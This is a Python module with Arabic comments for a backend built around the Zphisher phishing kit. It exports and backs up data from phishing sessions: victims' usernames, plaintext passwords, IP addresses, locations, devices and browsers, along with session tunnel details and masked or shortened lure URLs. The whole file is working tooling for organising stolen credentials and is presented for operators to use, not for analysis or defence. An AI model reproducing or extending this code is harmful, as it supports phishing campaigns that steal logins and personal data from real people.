"""
📁 نظام إدارة الملفات والتصدير المتقدم
يدير ملفات البيانات والتصدير بصيغ متعددة
"""

import asyncio
import logging
import json
import csv
import zipfile
import tempfile
from pathlib import Path
from typing import Dict, List, Any, Optional, Union
from datetime import datetime, timedelta
import pandas as pd
from io import BytesIO, StringIO
import aiofiles

from ..database import db_manager
from ..config import settings

logger = logging.getLogger(__name__)

class FileManager:
    """مدير الملفات المتقدم"""
    
    def __init__(self):
        self.export_formats = {
            'csv': self._export_to_csv,
            'excel': self._export_to_excel,
            'json': self._export_to_json,
            'txt': self._export_to_txt,
            'pdf': self._export_to_pdf,
            'xml': self._export_to_xml
        }
        
        # إنشاء المجلدات المطلوبة
        self.temp_dir = Path(settings.TEMP_DIR)
        self.upload_dir = Path(settings.UPLOAD_DIR)
        self.backup_dir = Path(settings.BACKUP_DIR)
        
        for directory in [self.temp_dir, self.upload_dir, self.backup_dir]:
            directory.mkdir(parents=True, exist_ok=True)
    
    async def export_session_data(self, session_id: str, format_type: str = 'csv', include_analysis: bool = True) -> Optional[Path]:
        """تصدير بيانات جلسة محددة"""
        
        try:
            # الحصول على بيانات الجلسة
            session_data = await self._get_session_export_data(session_id, include_analysis)
            
            if not session_data:
                logger.warning(f"لا توجد بيانات لتصدير الجلسة: {session_id}")
                return None
            
            # تصدير حسب الصيغة المطلوبة
            if format_type in self.export_formats:
                export_function = self.export_formats[format_type]
                return await export_function(session_data, f"session_{session_id}")
            else:
                logger.error(f"صيغة تصدير غير مدعومة: {format_type}")
                return None
                
        except Exception as e:
            logger.error(f"خطأ في تصدير بيانات الجلسة {session_id}: {e}")
            return None
    
    async def export_user_data(self, user_id: int, format_type: str = 'csv', date_range: Optional[tuple] = None) -> Optional[Path]:
        """تصدير جميع بيانات مستخدم"""
        
        try:
            # الحصول على بيانات المستخدم
            user_data = await self._get_user_export_data(user_id, date_range)
            
            if not user_data:
                logger.warning(f"لا توجد بيانات لتصدير المستخدم: {user_id}")
                return None
            
            # تصدير حسب الصيغة المطلوبة
            if format_type in self.export_formats:
                export_function = self.export_formats[format_type]
                return await export_function(user_data, f"user_{user_id}_data")
            else:
                logger.error(f"صيغة تصدير غير مدعومة: {format_type}")
                return None
                
        except Exception as e:
            logger.error(f"خطأ في تصدير بيانات المستخدم {user_id}: {e}")
            return None
    
    async def export_all_data(self, format_type: str = 'excel', date_range: Optional[tuple] = None) -> Optional[Path]:
        """تصدير جميع البيانات"""
        
        try:
            # الحصول على جميع البيانات
            all_data = await self._get_all_export_data(date_range)
            
            if not all_data:
                logger.warning("لا توجد بيانات للتصدير")
                return None
            
            # تصدير حسب الصيغة المطلوبة
            if format_type in self.export_formats:
                export_function = self.export_formats[format_type]
                return await export_function(all_data, "complete_database_export")
            else:
                logger.error(f"صيغة تصدير غير مدعومة: {format_type}")
                return None
                
        except Exception as e:
            logger.error(f"خطأ في تصدير جميع البيانات: {e}")
            return None
    
    async def create_backup(self, include_files: bool = True) -> Optional[Path]:
        """إنشاء نسخة احتياطية شاملة"""
        
        try:
            timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
            backup_filename = f"zphisher_backup_{timestamp}.zip"
            backup_path = self.backup_dir / backup_filename
            
            with zipfile.ZipFile(backup_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                
                # نسخ قاعدة البيانات
                db_export = await self.export_all_data('json')
                if db_export:
                    zip_file.write(db_export, 'database/complete_export.json')
                
                # نسخ ملفات الإعدادات
                config_files = ['.env', 'config.py']
                for config_file in config_files:
                    config_path = Path(config_file)
                    if config_path.exists():
                        zip_file.write(config_path, f'config/{config_file}')
                
                # نسخ ملفات البيانات المُلتقطة إذا كان مطلوب
                if include_files:
                    await self._add_data_files_to_backup(zip_file)
                
                # إضافة ملف معلومات النسخة الاحتياطية
                backup_info = {
                    'created_at': datetime.utcnow().isoformat(),
                    'version': '1.0',
                    'includes_files': include_files,
                    'total_sessions': await db_manager.get_total_sessions_count(),
                    'total_captures': await db_manager.get_total_captures_count(),
                    'total_users': await db_manager.get_total_users_count()
                }
                
                zip_file.writestr('backup_info.json', json.dumps(backup_info, indent=2))
            
            logger.info(f"تم إنشاء نسخة احتياطية: {backup_path}")
            return backup_path
            
        except Exception as e:
            logger.error(f"خطأ في إنشاء النسخة الاحتياطية: {e}")
            return None
    
    async def _get_session_export_data(self, session_id: str, include_analysis: bool) -> Optional[Dict[str, Any]]:
        """الحصول على بيانات الجلسة للتصدير"""
        
        try:
            # بيانات الجلسة الأساسية
            session = await db_manager.get_session_by_id(session_id)
            if not session:
                return None
            
            # البيانات المُلتقطة
            captured_data = await db_manager.get_session_captured_data(session_id)
            
            # إحصائيات الجلسة
            session_stats = await db_manager.get_session_statistics(session_id)
            
            export_data = {
                'session_info': {
                    'id': session.session_id,
                    'site_type': session.site_type,
                    'site_variant': session.site_variant,
                    'tunnel_type': session.tunnel_type,
                    'status': session.status,
                    'created_at': session.created_at.isoformat(),
                    'started_at': session.started_at.isoformat() if session.started_at else None,
                    'stopped_at': session.stopped_at.isoformat() if session.stopped_at else None,
                    'local_url': session.local_url,
                    'public_url': session.public_url,
                    'short_url': session.short_url,
                    'masked_url': session.masked_url
                },
                'statistics': session_stats,
                'captured_data': []
            }
            
            # معالجة البيانات المُلتقطة
            for capture in captured_data:
                capture_dict = {
                    'id': capture.id,
                    'username': capture.username,
                    'password': '***' if not include_analysis else capture.password,  # إخفاء كلمات المرور في التصدير العادي
                    'ip_address': capture.ip_address,
                    'country': capture.country,
                    'city': capture.city,
                    'isp': capture.isp,
                    'device_type': capture.device_type,
                    'os': capture.os,
                    'browser': capture.browser,
                    'user_agent': capture.user_agent,
                    'is_verified': capture.is_verified,
                    'captured_at': capture.captured_at.isoformat(),
                    'additional_data': capture.additional_data
                }
                
                export_data['captured_data'].append(capture_dict)
            
            # إضافة التحليل المتقدم إذا كان مطلوب
            if include_analysis:
                from .analytics import data_analyzer
                analytics = await data_analyzer.get_session_analytics(session_id)
                export_data['analytics'] = analytics
            
            return export_data
            
        except Exception as e:
            logger.error(f"خطأ في الحصول على بيانات الجلسة للتصدير: {e}")
            return None
    
    async def _get_user_export_data(self, user_id: int, date_range: Optional[tuple]) -> Optional[Dict[str, Any]]:
        """الحصول على بيانات المستخدم للتصدير"""
        
        try:
            # معلومات المستخدم
            user = await db_manager.get_user_by_id(user_id)
            if not user:
                return None
            
            # جلسات المستخدم
            user_sessions = await db_manager.get_user_sessions(
                user_id, 
                date_from=date_range[0] if date_range else None,
                date_to=date_range[1] if date_range else None
            )
            
            # إحصائيات المستخدم
            user_stats = await db_manager.get_user_statistics(user_id)
            
            export_data = {
                'user_info': {
                    'id': user.user_id,
                    'first_name': user.first_name,
                    'last_name': user.last_name,
                    'username': user.username,
                    'role': user.role,
                    'is_active': user.is_active,
                    'created_at': user.created_at.isoformat(),
                    'last_seen': user.last_seen.isoformat()
                },
                'statistics': user_stats,
                'sessions': [],
                'total_captures': 0
            }
            
            # معالجة جلسات المستخدم
            for session in user_sessions:
                session_data = await self._get_session_export_data(session.session_id, False)
                if session_data:
                    export_data['sessions'].append(session_data)
                    export_data['total_captures'] += len(session_data['captured_data'])
            
            return export_data
            
        except Exception as e:
            logger.error(f"خطأ في الحصول على بيانات المستخدم للتصدير: {e}")
            return None
    
    async def _get_all_export_data(self, date_range: Optional[tuple]) -> Optional[Dict[str, Any]]:
        """الحصول على جميع البيانات للتصدير"""
        
        try:
            # المستخدمون
            all_users = await db_manager.get_all_users()
            
            # الجلسات
            all_sessions = await db_manager.get_all_sessions(
                date_from=date_range[0] if date_range else None,
                date_to=date_range[1] if date_range else None
            )
            
            # إحصائيات عامة
            general_stats = await db_manager.get_general_statistics()
            
            export_data = {
                'export_info': {
                    'created_at': datetime.utcnow().isoformat(),
                    'date_range': {
                        'from': date_range[0].isoformat() if date_range and date_range[0] else None,
                        'to': date_range[1].isoformat() if date_range and date_range[1] else None
                    } if date_range else None,
                    'total_users': len(all_users),
                    'total_sessions': len(all_sessions)
                },
                'statistics': general_stats,
                'users': [],
                'sessions': []
            }
            
            # معالجة المستخدمين
            for user in all_users:
                user_data = {
                    'id': user.user_id,
                    'first_name': user.first_name,
                    'last_name': user.last_name,
                    'username': user.username,
                    'role': user.role,
                    'is_active': user.is_active,
                    'created_at': user.created_at.isoformat(),
                    'last_seen': user.last_seen.isoformat()
                }
                export_data['users'].append(user_data)
            
            # معالجة الجلسات
            for session in all_sessions:
                session_data = await self._get_session_export_data(session.session_id, False)
                if session_data:
                    export_data['sessions'].append(session_data)
            
            return export_data
            
        except Exception as e:
            logger.error(f"خطأ في الحصول على جميع البيانات للتصدير: {e}")
            return None
    
    async def _export_to_csv(self, data: Dict[str, Any], filename_prefix: str) -> Path:
        """تصدير إلى CSV"""
        
        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        csv_path = self.temp_dir / f"{filename_prefix}_{timestamp}.csv"
        
        # تحضير البيانات للـ CSV
        csv_data = []
        
        if 'captured_data' in data:
            # تصدير بيانات جلسة واحدة
            for capture in data['captured_data']:
                row = {
                    'Session ID': data['session_info']['id'],
                    'Site Type': data['session_info']['site_type'],
                    'Username': capture['username'],
                    'IP Address': capture['ip_address'],
                    'Country': capture['country'],
                    'City': capture['city'],
                    'Device': capture['device_type'],
                    'OS': capture['os'],
                    'Browser': capture['browser'],
                    'Captured At': capture['captured_at'],
                    'Verified': capture['is_verified']
                }
                csv_data.append(row)
        
        elif 'sessions' in data:
            # تصدير بيانات مستخدم أو جميع البيانات
            for session in data['sessions']:
                for capture in session.get('captured_data', []):
                    row = {
                        'User ID': data.get('user_info', {}).get('id', 'N/A'),
                        'Session ID': session['session_info']['id'],
                        'Site Type': session['session_info']['site_type'],
                        'Username': capture['username'],
                        'IP Address': capture['ip_address'],
                        'Country': capture['country'],
                        'City': capture['city'],
                        'Device': capture['device_type'],
                        'OS': capture['os'],
                        'Browser': capture['browser'],
                        'Captured At': capture['captured_at'],
                        'Verified': capture['is_verified']
                    }
                    csv_data.append(row)
        
        # كتابة CSV
        if csv_data:
            df = pd.DataFrame(csv_data)
            df.to_csv(csv_path, index=False, encoding='utf-8-sig')
        
        return csv_path
    
    async def _export_to_excel(self, data: Dict[str, Any], filename_prefix: str) -> Path:
        """تصدير إلى Excel مع أوراق متعددة"""
        
        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        excel_path = self.temp_dir / f"{filename_prefix}_{timestamp}.xlsx"
        
        with pd.ExcelWriter(excel_path, engine='openpyxl') as writer:
            
            # ورقة المعلومات العامة
            if 'session_info' in data:
                # بيانات جلسة واحدة
                session_info_df = pd.DataFrame([data['session_info']])
                session_info_df.to_excel(writer, sheet_name='Session Info', index=False)
                
                if data['captured_data']:
                    captures_df = pd.DataFrame(data['captured_data'])
                    captures_df.to_excel(writer, sheet_name='Captured Data', index=False)
                
                if 'statistics' in data:
                    stats_df = pd.DataFrame([data['statistics']])
                    stats_df.to_excel(writer, sheet_name='Statistics', index=False)
            
            elif 'user_info' in data:
                # بيانات مستخدم
                user_info_df = pd.DataFrame([data['user_info']])
                user_info_df.to_excel(writer, sheet_name='User Info', index=False)
                
                # جمع جميع البيانات المُلتقطة
                all_captures = []
                for session in data['sessions']:
                    for capture in session.get('captured_data', []):
                        capture['session_id'] = session['session_info']['id']
                        capture['site_type'] = session['session_info']['site_type']
                        all_captures.append(capture)
                
                if all_captures:
                    captures_df = pd.DataFrame(all_captures)
                    captures_df.to_excel(writer, sheet_name='All Captures', index=False)
            
            elif 'users' in data and 'sessions' in data:
                # جميع البيانات
                users_df = pd.DataFrame(data['users'])
                users_df.to_excel(writer, sheet_name='Users', index=False)
                
                # معلومات الجلسات
                sessions_info = []
                all_captures = []
                
                for session in data['sessions']:
                    sessions_info.append(session['session_info'])
                    for capture in session.get('captured_data', []):
                        capture['session_id'] = session['session_info']['id']
                        capture['site_type'] = session['session_info']['site_type']
                        all_captures.append(capture)
                
                if sessions_info:
                    sessions_df = pd.DataFrame(sessions_info)
                    sessions_df.to_excel(writer, sheet_name='Sessions', index=False)
                
                if all_captures:
                    captures_df = pd.DataFrame(all_captures)
                    captures_df.to_excel(writer, sheet_name='Captured Data', index=False)
        
        return excel_path
    
    async def _export_to_json(self, data: Dict[str, Any], filename_prefix: str) -> Path:
        """تصدير إلى JSON"""
        
        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        json_path = self.temp_dir / f"{filename_prefix}_{timestamp}.json"
        
        async with aiofiles.open(json_path, 'w', encoding='utf-8') as f:
            await f.write(json.dumps(data, indent=2, ensure_ascii=False, default=str))
        
        return json_path
    
    async def _export_to_txt(self, data: Dict[str, Any], filename_prefix: str) -> Path:
        """تصدير إلى TXT منسق"""
        
        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        txt_path = self.temp_dir / f"{filename_prefix}_{timestamp}.txt"
        
        content = []
        content.append("=" * 80)
        content.append(f"تصدير بيانات Zphisher - {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}")
        content.append("=" * 80)
        content.append("")
        
        if 'session_info' in data:
            # بيانات جلسة واحدة
            session = data['session_info']
            content.append(f"معلومات الجلسة:")
            content.append(f"  المعرف: {session['id']}")
            content.append(f"  نوع الموقع: {session['site_type']}")
            content.append(f"  حالة النفق: {session['tunnel_type']}")
            content.append(f"  الحالة: {session['status']}")
            content.append(f"  تاريخ الإنشاء: {session['created_at']}")
            content.append("")
            
            content.append(f"البيانات المُلتقطة ({len(data['captured_data'])}):")
            content.append("-" * 40)
            
            for i, capture in enumerate(data['captured_data'], 1):
                content.append(f"{i}. المستخدم: {capture['username']}")
                content.append(f"   العنوان: {capture['ip_address']}")
                content.append(f"   البلد: {capture['country']}")
                content.append(f"   المدينة: {capture['city']}")
                content.append(f"   الجهاز: {capture['device_type']}")
                content.append(f"   الوقت: {capture['captured_at']}")
                content.append("")
        
        elif 'sessions' in data:
            # بيانات متعددة
            total_captures = sum(len(s.get('captured_data', [])) for s in data['sessions'])
            content.append(f"إجمالي الجلسات: {len(data['sessions'])}")
            content.append(f"إجمالي البيانات المُلتقطة: {total_captures}")
            content.append("")
            
            for session in data['sessions']:
                session_info = session['session_info']
                content.append(f"الجلسة: {session_info['id']}")
                content.append(f"  الموقع: {session_info['site_type']}")
                content.append(f"  البيانات: {len(session.get('captured_data', []))}")
                content.append("")
        
        async with aiofiles.open(txt_path, 'w', encoding='utf-8') as f:
            await f.write('\n'.join(content))
        
        return txt_path
    
    async def _export_to_pdf(self, data: Dict[str, Any], filename_prefix: str) -> Path:
        """تصدير إلى PDF (تنفيذ مبسط)"""
        
        # هذا يتطلب مكتبة إضافية مثل reportlab
        # للآن سنقوم بإنشاء ملف نصي بدلاً من PDF
        
        return await self._export_to_txt(data, filename_prefix)
    
    async def _export_to_xml(self, data: Dict[str, Any], filename_prefix: str) -> Path:
        """تصدير إلى XML"""
        
        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        xml_path = self.temp_dir / f"{filename_prefix}_{timestamp}.xml"
        
        def dict_to_xml(tag, d):
            """تحويل قاموس إلى XML"""
            xml_str = f"<{tag}>"
            for key, val in d.items():
                if isinstance(val, dict):
                    xml_str += dict_to_xml(key, val)
                elif isinstance(val, list):
                    for item in val:
                        if isinstance(item, dict):
                            xml_str += dict_to_xml(key[:-1] if key.endswith('s') else key, item)
                        else:
                            xml_str += f"<{key}>{item}</{key}>"
                else:
                    xml_str += f"<{key}>{val}</{key}>"
            xml_str += f"</{tag}>"
            return xml_str
        
        xml_content = '<?xml version="1.0" encoding="UTF-8"?>\n'
        xml_content += dict_to_xml("zphisher_export", data)
        
        async with aiofiles.open(xml_path, 'w', encoding='utf-8') as f:
            await f.write(xml_content)
        
        return xml_path
    
    async def _add_data_files_to_backup(self, zip_file: zipfile.ZipFile):
        """إضافة ملفات البيانات للنسخة الاحتياطية"""
        
        try:
            # البحث عن ملفات البيانات في مجلدات Zphisher
            zphisher_path = Path(settings.ZPHISHER_PATH)
            
            data_patterns = ['*.dat', '*.txt', '*.json', '*.log']
            
            for pattern in data_patterns:
                for file_path in zphisher_path.rglob(pattern):
                    if file_path.is_file() and file_path.stat().st_size > 0:
                        # إضافة الملف للنسخة الاحتياطية
                        relative_path = file_path.relative_to(zphisher_path)
                        zip_file.write(file_path, f"data_files/{relative_path}")
        
        except Exception as e:
            logger.warning(f"تحذير: فشل في إضافة ملفات البيانات للنسخة الاحتياطية: {e}")
    
    async def cleanup_temp_files(self, older_than_hours: int = 24):
        """تنظيف الملفات المؤقتة القديمة"""
        
        try:
            cutoff_time = datetime.utcnow() - timedelta(hours=older_than_hours)
            deleted_count = 0
            
            for file_path in self.temp_dir.iterdir():
                if file_path.is_file():
                    file_time = datetime.fromtimestamp(file_path.stat().st_mtime)
                    if file_time < cutoff_time:
                        file_path.unlink()
                        deleted_count += 1
            
            logger.info(f"تم حذف {deleted_count} ملف مؤقت قديم")
            
        except Exception as e:
            logger.error(f"خطأ في تنظيف الملفات المؤقتة: {e}")
    
    async def get_file_info(self, file_path: Path) -> Dict[str, Any]:
        """الحصول على معلومات ملف"""
        
        try:
            if not file_path.exists():
                return {"error": "الملف غير موجود"}
            
            stat = file_path.stat()
            
            return {
                "name": file_path.name,
                "size": stat.st_size,
                "size_mb": round(stat.st_size / (1024 * 1024), 2),
                "created": datetime.fromtimestamp(stat.st_ctime).isoformat(),
                "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                "extension": file_path.suffix,
                "path": str(file_path)
            }
            
        except Exception as e:
            return {"error": str(e)}

# مثيل عام
file_manager = FileManager()